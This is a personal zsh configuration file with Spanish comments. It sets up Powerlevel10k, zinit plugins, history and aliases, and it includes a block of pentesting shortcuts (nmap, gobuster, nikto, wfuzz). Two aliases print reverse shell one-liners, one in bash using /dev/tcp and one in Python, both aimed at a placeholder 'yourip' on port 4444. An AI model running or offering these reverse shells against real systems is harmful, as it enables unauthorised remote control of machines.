# ─────────────────────────────────────────────────────────────
# ⚡ Instant Prompt de Powerlevel10k (debe ir al inicio)
# ─────────────────────────────────────────────────────────────
if [[ -r "${XDG_CACHE_HOME:-$HOME/.cache}/p10k-instant-prompt-${(%):-%n}.zsh" ]]; then
  source "${XDG_CACHE_HOME:-$HOME/.cache}/p10k-instant-prompt-${(%):-%n}.zsh"
fi

# ─────────────────────────────────────────────────────────────
# 🍎 Homebrew
# ─────────────────────────────────────────────────────────────
if [[ -f "/opt/homebrew/bin/brew" ]]; then
  eval "$(/opt/homebrew/bin/brew shellenv)"
fi

# ─────────────────────────────────────────────────────────────
# 📦 Zinit - Plugin Manager
# ─────────────────────────────────────────────────────────────
ZINIT_HOME="${XDG_DATA_HOME:-${HOME}/.local/share}/zinit/zinit.git"

if [[ ! -d "$ZINIT_HOME" ]]; then
  mkdir -p "$(dirname "$ZINIT_HOME")"
  git clone https://github.com/zdharma-continuum/zinit.git "$ZINIT_HOME"
fi

source "${ZINIT_HOME}/zinit.zsh"

# ─────────────────────────────────────────────────────────────
# 💡 Powerlevel10k y Plugins Esenciales
# ─────────────────────────────────────────────────────────────
zinit ice depth=1; zinit light romkatv/powerlevel10k

zinit light zsh-users/zsh-syntax-highlighting
zinit light zsh-users/zsh-completions
zinit light zsh-users/zsh-autosuggestions
zinit light Aloxaf/fzf-tab

# ─────────────────────────────────────────────────────────────
# 🌐 Snippets desde Oh-My-Zsh
# ─────────────────────────────────────────────────────────────
zinit snippet OMZL::git.zsh
zinit snippet OMZP::git
zinit snippet OMZP::sudo
zinit snippet OMZP::archlinux
zinit snippet OMZP::aws
zinit snippet OMZP::kubectl
zinit snippet OMZP::kubectx
zinit snippet OMZP::command-not-found

# ─────────────────────────────────────────────────────────────
# 🔄 Completado Inteligente y Coloreado
# ─────────────────────────────────────────────────────────────
autoload -Uz compinit && compinit
zinit cdreplay -q

zstyle ':completion:*' matcher-list 'm:{a-z}={A-Za-z}'
zstyle ':completion:*' list-colors "${(s.:.)LS_COLORS}"
zstyle ':completion:*' menu no
zstyle ':fzf-tab:complete:cd:*' fzf-preview 'ls --color $realpath'
zstyle ':fzf-tab:complete:__zoxide_z:*' fzf-preview 'ls --color $realpath'

# ─────────────────────────────────────────────────────────────
# 🎯 Keybindings personalizados
# ─────────────────────────────────────────────────────────────
bindkey -e
bindkey '^p' history-search-backward
bindkey '^n' history-search-forward
bindkey '^[w' kill-region

# ─────────────────────────────────────────────────────────────
# 📜 Historial mejorado
# ─────────────────────────────────────────────────────────────
HISTSIZE=5000
HISTFILE=~/.zsh_history
SAVEHIST=$HISTSIZE
HISTDUP=erase

setopt appendhistory
setopt sharehistory
setopt hist_ignore_space
setopt hist_ignore_all_dups
setopt hist_save_no_dups
setopt hist_ignore_dups
setopt hist_find_no_dups

# ─────────────────────────────────────────────────────────────
# 🧩 Aliases útiles
# ─────────────────────────────────────────────────────────────
alias ls='ls --color'
alias vim='nvim'
alias c='clear'
alias grep='grep --color=auto'
alias egrep='egrep --color=auto'
alias fgrep='fgrep --color=auto'
alias fzfbat='fzf --preview="bat --theme=gruvbox-dark --color=always {}"'
alias fzfnvim='nvim $(fzf --preview="bat --theme=gruvbox-dark --color=always {}")'
alias update-flake='darwin-rebuild switch --flake ~/nix#Alt3rw0r1D'

# 🔎 Network Scanning
alias scanhost="nmap -sC -sV -Pn"
alias fscan="nmap -F --top-ports 1000"
alias sniffer="sudo tcpdump -i any -n"
alias myip="ip a | grep inet"

# 🔥 Web Analysis
alias gobusterdir="gobuster dir -u"
alias nikscan="nikto -h"
alias wfuzzxss="wfuzz -c -z file,wordlist.txt --hs 404 -u 'http://target.com/FUZZ'"

# 🧠 OSINT & Reco
alias whoislookup="whois"
alias digdns="dig +short"

# 🐚 Reverse Shell Generators
alias revbash="echo 'bash -i >& /dev/tcp/yourip/4444 0>&1'"
alias revpython='echo "python -c \"import socket,subprocess,os; s=socket.socket(); s.connect((\\\"yourip\\\",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\\\"/bin/sh\\\"])\""'

# 🧪 Utilidades Rápidas
alias ports="ss -tulwn"
alias up="sudo apt update && sudo apt upgrade -y"
alias reloadzsh="source ~/.zshrc"

# 🧙‍♂️ Sombra digital
alias vanish="clear && neofetch && echo 'Sistema Oscuro Activado 🧬'"



# ─────────────────────────────────────────────────────────────
# 🧠 Shell Integrations
# ─────────────────────────────────────────────────────────────
eval "$(fzf --zsh)"
eval "$(zoxide init --cmd cd zsh)"

# ─────────────────────────────────────────────────────────────
# 📺 Gestor de terminal: tmux/zellij
# ─────────────────────────────────────────────────────────────
WM_VAR="/$TMUX"      # cambia a ZELLIJ si lo usas
WM_CMD="tmux"        # cambia a zellij si prefieres

function start_if_needed() {
   if [[ $- == *i* ]] && [[ -z "${WM_VAR#/}" ]] && [[ -t 1 ]]; then
        exec $WM_CMD
   fi
}

# ─────────────────────────────────────────────────────────────
# 🛣️ PATH y variables de entorno
# ─────────────────────────────────────────────────────────────
export PATH="$HOME/.local/bin:$PATH"
export CLICOLOR=1
export LSCOLORS=GxFxCxDxBxegedabagaced
export BAT_THEME="gruvbox-dark"

# ─────────────────────────────────────────────────────────────
# 🎨 Powerlevel10k Prompt
# ─────────────────────────────────────────────────────────────
[[ ! -f ~/.p10k.zsh ]] || source ~/.p10k.zsh

# ─────────────────────────────────────────────────────────────
# 🚀 (Opcional) Prompt alternativo con Starship
# ─────────────────────────────────────────────────────────────
# eval "$(starship init zsh)"
